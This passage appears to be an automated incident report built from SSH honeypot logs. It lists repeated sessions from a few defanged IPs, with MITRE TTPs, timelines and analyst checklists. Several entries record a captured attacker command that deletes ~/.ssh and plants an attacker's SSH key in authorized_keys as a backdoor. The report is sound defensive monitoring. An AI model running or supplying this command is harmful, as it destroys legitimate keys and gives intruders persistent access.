| `2026-04-06 11:09:17` | `cowrie.command.failed` |
| `2026-04-06 11:09:18` | `cowrie.log.closed` |
| `2026-04-06 11:09:18` | `cowrie.session.params` |
| `2026-04-06 11:09:18` | `cowrie.command.input` |
| `2026-04-06 11:09:18` | `cowrie.session.file_download` |
| `2026-04-06 11:09:18` | `cowrie.log.closed` |
| `2026-04-06 11:09:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.248.82[.]58` to AbuseIPDB if not already reported
- [ ] Block `14.248.82[.]58` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23ee1bd88f82

| Field | Detail |
|---|---|
| **Source IP** | `14.248.82[.]58` |
| **First Seen** | 2026-04-06 11:09 |
| **Last Seen** | 2026-04-06 11:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 11:09:20` | `cowrie.session.connect` |
| `2026-04-06 11:09:20` | `cowrie.client.version` |
| `2026-04-06 11:09:20` | `cowrie.client.kex` |
| `2026-04-06 11:09:21` | `cowrie.login.success` |
| `2026-04-06 11:09:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.248.82[.]58` to AbuseIPDB if not already reported
- [ ] Block `14.248.82[.]58` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ea98b8c686d

| Field | Detail |
|---|---|
| **Source IP** | `154.18.197[.]35` |
| **First Seen** | 2026-04-06 11:09 |
| **Last Seen** | 2026-04-06 11:09 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 11:09:25` | `cowrie.session.connect` |
| `2026-04-06 11:09:25` | `cowrie.client.version` |
| `2026-04-06 11:09:25` | `cowrie.client.kex` |
| `2026-04-06 11:09:26` | `cowrie.login.success` |
| `2026-04-06 11:09:26` | `cowrie.session.params` |
| `2026-04-06 11:09:26` | `cowrie.command.input` |
| `2026-04-06 11:09:26` | `cowrie.command.failed` |
| `2026-04-06 11:09:26` | `cowrie.log.closed` |
| `2026-04-06 11:09:26` | `cowrie.session.params` |
| `2026-04-06 11:09:26` | `cowrie.command.input` |
| `2026-04-06 11:09:27` | `cowrie.session.file_download` |
| `2026-04-06 11:09:27` | `cowrie.log.closed` |
| `2026-04-06 11:09:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.18.197[.]35` to AbuseIPDB if not already reported
- [ ] Block `154.18.197[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d78e8c5afa3b

| Field | Detail |
|---|---|
| **Source IP** | `154.18.197[.]35` |
| **First Seen** | 2026-04-06 11:09 |
| **Last Seen** | 2026-04-06 11:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 11:09:28` | `cowrie.session.connect` |
| `2026-04-06 11:09:28` | `cowrie.client.version` |
| `2026-04-06 11:09:28` | `cowrie.client.kex` |
| `2026-04-06 11:09:29` | `cowrie.login.success` |
| `2026-04-06 11:09:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.18.197[.]35` to AbuseIPDB if not already reported
- [ ] Block `154.18.197[.]35` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a3edb95fe0f0

| Field | Detail |
|---|---|
| **Source IP** | `103.56.30[.]33` |
| **First Seen** | 2026-04-06 11:10 |
| **Last Seen** | 2026-04-06 11:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 11:10:40` | `cowrie.session.connect` |
| `2026-04-06 11:10:40` | `cowrie.client.version` |
| `2026-04-06 11:10:40` | `cowrie.client.kex` |
| `2026-04-06 11:10:40` | `cowrie.login.success` |
| `2026-04-06 11:10:40` | `cowrie.session.params` |
| `2026-04-06 11:10:40` | `cowrie.command.input` |
| `2026-04-06 11:10:40` | `cowrie.command.failed` |
| `2026-04-06 11:10:40` | `cowrie.log.closed` |
| `2026-04-06 11:10:40` | `cowrie.session.params` |
| `2026-04-06 11:10:40` | `cowrie.command.input` |
| `2026-04-06 11:10:40` | `cowrie.session.file_download` |
| `2026-04-06 11:10:40` | `cowrie.log.closed` |
| `2026-04-06 11:10:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.56.30[.]33` to AbuseIPDB if not already reported
- [ ] Block `103.56.30[.]33` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0e276ad0d9c

| Field | Detail |
|---|---|
| **Source IP** | `103.56.30[.]33` |
| **First Seen** | 2026-04-06 11:10 |
| **Last Seen** | 2026-04-06 11:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 11:10:41` | `cowrie.session.connect` |
| `2026-04-06 11:10:41` | `cowrie.client.version` |
| `2026-04-06 11:10:41` | `cowrie.client.kex` |
| `2026-04-06 11:10:42` | `cowrie.login.success` |
| `2026-04-06 11:10:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.56.30[.]33` to AbuseIPDB if not already reported
- [ ] Block `103.56.30[.]33` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d6518186357

| Field | Detail |
|---|---|
| **Source IP** | `154.18.197[.]35` |
| **First Seen** | 2026-04-06 11:20 |
| **Last Seen** | 2026-04-06 11:20 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 11:20:42` | `cowrie.session.connect` |
| `2026-04-06 11:20:42` | `cowrie.client.version` |
| `2026-04-06 11:20:42` | `cowrie.client.kex` |
| `2026-04-06 11:20:42` | `cowrie.login.success` |
| `2026-04-06 11:20:42` | `cowrie.session.params` |
| `2026-04-06 11:20:42` | `cowrie.command.input` |
| `2026-04-06 11:20:42` | `cowrie.command.failed` |
| `2026-04-06 11:20:43` | `cowrie.log.closed` |
| `2026-04-06 11:20:43` | `cowrie.session.params` |
| `2026-04-06 11:20:43` | `cowrie.command.input` |
| `2026-04-06 11:20:43` | `cowrie.session.file_download` |
| `2026-04-06 11:20:43` | `cowrie.log.closed` |
| `2026-04-06 11:20:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.18.197[.]35` to AbuseIPDB if not already reported
- [ ] Block `154.18.197[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-721804d2d2c0

| Field | Detail |
|---|---|
| **Source IP** | `154.18.197[.]35` |
| **First Seen** | 2026-04-06 11:20 |
| **Last Seen** | 2026-04-06 11:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 11:20:45` | `cowrie.session.connect` |
| `2026-04-06 11:20:45` | `cowrie.client.version` |
| `2026-04-06 11:20:45` | `cowrie.client.kex` |
| `2026-04-06 11:20:45` | `cowrie.login.success` |
| `2026-04-06 11:20:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.18.197[.]35` to AbuseIPDB if not already reported
- [ ] Block `154.18.197[.]35` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b2aa31b0e6e2

| Field | Detail |
|---|---|
| **Source IP** | `154.18.197[.]35` |
| **First Seen** | 2026-04-06 11:24 |
| **Last Seen** | 2026-04-06 11:24 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 11:24:16` | `cowrie.session.connect` |
| `2026-04-06 11:24:16` | `cowrie.client.version` |
| `2026-04-06 11:24:16` | `cowrie.client.kex` |
| `2026-04-06 11:24:16` | `cowrie.login.success` |
| `2026-04-06 11:24:17` | `cowrie.session.params` |
| `2026-04-06 11:24:17` | `cowrie.command.input` |
| `2026-04-06 11:24:17` | `cowrie.command.failed` |
| `2026-04-06 11:24:17` | `cowrie.log.closed` |
| `2026-04-06 11:24:17` | `cowrie.session.params` |
| `2026-04-06 11:24:17` | `cowrie.command.input` |
| `2026-04-06 11:24:17` | `cowrie.session.file_download` |
| `2026-04-06 11:24:17` | `cowrie.log.closed` |
| `2026-04-06 11:24:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.18.197[.]35` to AbuseIPDB if not already reported
- [ ] Block `154.18.197[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-002a17d8bcc2

| Field | Detail |
|---|---|
| **Source IP** | `154.18.197[.]35` |
| **First Seen** | 2026-04-06 11:24 |
| **Last Seen** | 2026-04-06 11:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 11:24:19` | `cowrie.session.connect` |
| `2026-04-06 11:24:19` | `cowrie.client.version` |
| `2026-04-06 11:24:19` | `cowrie.client.kex` |
| `2026-04-06 11:24:20` | `cowrie.login.success` |
| `2026-04-06 11:24:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.18.197[.]35` to AbuseIPDB if not already reported
- [ ] Block `154.18.197[.]35` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ed1060b420c

| Field | Detail |
|---|---|
| **Source IP** | `103.56.30[.]33` |
| **First Seen** | 2026-04-06 11:24 |
| **Last Seen** | 2026-04-06 11:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 11:24:58` | `cowrie.session.connect` |
| `2026-04-06 11:24:58` | `cowrie.client.version` |
| `2026-04-06 11:24:59` | `cowrie.client.kex` |
| `2026-04-06 11:24:59` | `cowrie.login.success` |
| `2026-04-06 11:24:59` | `cowrie.session.params` |
| `2026-04-06 11:24:59` | `cowrie.command.input` |
| `2026-04-06 11:24:59` | `cowrie.command.failed` |
| `2026-04-06 11:24:59` | `cowrie.log.closed` |
| `2026-04-06 11:24:59` | `cowrie.session.params` |
| `2026-04-06 11:24:59` | `cowrie.command.input` |
| `2026-04-06 11:24:59` | `cowrie.session.file_download` |
| `2026-04-06 11:24:59` | `cowrie.log.closed` |
| `2026-04-06 11:25:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.56.30[.]33` to AbuseIPDB if not already reported
- [ ] Block `103.56.30[.]33` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a6272f6d1fc0

| Field | Detail |
|---|---|
| **Source IP** | `103.56.30[.]33` |
| **First Seen** | 2026-04-06 11:25 |
| **Last Seen** | 2026-04-06 11:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 11:25:00` | `cowrie.session.connect` |
| `2026-04-06 11:25:00` | `cowrie.client.version` |
| `2026-04-06 11:25:00` | `cowrie.client.kex` |
| `2026-04-06 11:25:00` | `cowrie.login.success` |
| `2026-04-06 11:25:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.56.30[.]33` to AbuseIPDB if not already reported
- [ ] Block `103.56.30[.]33` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9fb30964da09

| Field | Detail |
|---|---|
| **Source IP** | `154.18.197[.]35` |
| **First Seen** | 2026-04-06 11:29 |
| **Last Seen** | 2026-04-06 11:29 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 11:29:46` | `cowrie.session.connect` |
| `2026-04-06 11:29:46` | `cowrie.client.version` |
| `2026-04-06 11:29:46` | `cowrie.client.kex` |
| `2026-04-06 11:29:46` | `cowrie.login.success` |
| `2026-04-06 11:29:47` | `cowrie.session.params` |
| `2026-04-06 11:29:47` | `cowrie.command.input` |
| `2026-04-06 11:29:47` | `cowrie.command.failed` |
| `2026-04-06 11:29:47` | `cowrie.log.closed` |
| `2026-04-06 11:29:47` | `cowrie.session.params` |
| `2026-04-06 11:29:47` | `cowrie.command.input` |
| `2026-04-06 11:29:47` | `cowrie.session.file_download` |
| `2026-04-06 11:29:47` | `cowrie.log.closed` |
| `2026-04-06 11:29:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.18.197[.]35` to AbuseIPDB if not already reported
- [ ] Block `154.18.197[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0dcdb89820ec

| Field | Detail |
|---|---|
| **Source IP** | `154.18.197[.]35` |
| **First Seen** | 2026-04-06 11:29 |
| **Last Seen** | 2026-04-06 11:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 11:29:49` | `cowrie.session.connect` |
| `2026-04-06 11:29:49` | `cowrie.client.version` |
| `2026-04-06 11:29:49` | `cowrie.client.kex` |
| `2026-04-06 11:29:49` | `cowrie.login.success` |
| `2026-04-06 11:29:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.18.197[.]35` to AbuseIPDB if not already reported
- [ ] Block `154.18.197[.]35` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd481a6647b8

| Field | Detail |
|---|---|
| **Source IP** | `154.18.197[.]35` |
| **First Seen** | 2026-04-06 11:33 |
| **Last Seen** | 2026-04-06 11:33 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 11:33:45` | `cowrie.session.connect` |
| `2026-04-06 11:33:45` | `cowrie.client.version` |
| `2026-04-06 11:33:45` | `cowrie.client.kex` |
| `2026-04-06 11:33:45` | `cowrie.login.success` |
| `2026-04-06 11:33:45` | `cowrie.session.params` |
| `2026-04-06 11:33:45` | `cowrie.command.input` |
| `2026-04-06 11:33:45` | `cowrie.command.failed` |
| `2026-04-06 11:33:46` | `cowrie.log.closed` |
| `2026-04-06 11:33:46` | `cowrie.session.params` |
| `2026-04-06 11:33:46` | `cowrie.command.input` |
| `2026-04-06 11:33:46` | `cowrie.session.file_download` |
| `2026-04-06 11:33:46` | `cowrie.log.closed` |
| `2026-04-06 11:33:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.18.197[.]35` to AbuseIPDB if not already reported
- [ ] Block `154.18.197[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a9d8fa6d188

| Field | Detail |
|---|---|
| **Source IP** | `154.18.197[.]35` |
| **First Seen** | 2026-04-06 11:33 |
| **Last Seen** | 2026-04-06 11:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 11:33:48` | `cowrie.session.connect` |
| `2026-04-06 11:33:48` | `cowrie.client.version` |
| `2026-04-06 11:33:48` | `cowrie.client.kex` |
| `2026-04-06 11:33:48` | `cowrie.login.success` |
| `2026-04-06 11:33:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.18.197[.]35` to AbuseIPDB if not already reported
- [ ] Block `154.18.197[.]35` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5637bdc6ce31

| Field | Detail |
|---|---|
| **Source IP** | `154.18.197[.]35` |
| **First Seen** | 2026-04-06 11:35 |
| **Last Seen** | 2026-04-06 11:35 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 11:35:49` | `cowrie.session.connect` |
| `2026-04-06 11:35:49` | `cowrie.client.version` |
| `2026-04-06 11:35:49` | `cowrie.client.kex` |
| `2026-04-06 11:35:50` | `cowrie.login.success` |
| `2026-04-06 11:35:50` | `cowrie.session.params` |
| `2026-04-06 11:35:50` | `cowrie.command.input` |
| `2026-04-06 11:35:50` | `cowrie.command.failed` |
| `2026-04-06 11:35:50` | `cowrie.log.closed` |
| `2026-04-06 11:35:50` | `cowrie.session.params` |
| `2026-04-06 11:35:50` | `cowrie.command.input` |
| `2026-04-06 11:35:51` | `cowrie.session.file_download` |
| `2026-04-06 11:35:51` | `cowrie.log.closed` |
| `2026-04-06 11:35:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.18.197[.]35` to AbuseIPDB if not already reported
- [ ] Block `154.18.197[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf9b9790c654

| Field | Detail |
|---|---|
| **Source IP** | `154.18.197[.]35` |
| **First Seen** | 2026-04-06 11:35 |
| **Last Seen** | 2026-04-06 11:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 11:35:52` | `cowrie.session.connect` |
| `2026-04-06 11:35:52` | `cowrie.client.version` |
| `2026-04-06 11:35:52` | `cowrie.client.kex` |
| `2026-04-06 11:35:53` | `cowrie.login.success` |
| `2026-04-06 11:35:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.18.197[.]35` to AbuseIPDB if not already reported
- [ ] Block `154.18.197[.]35` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

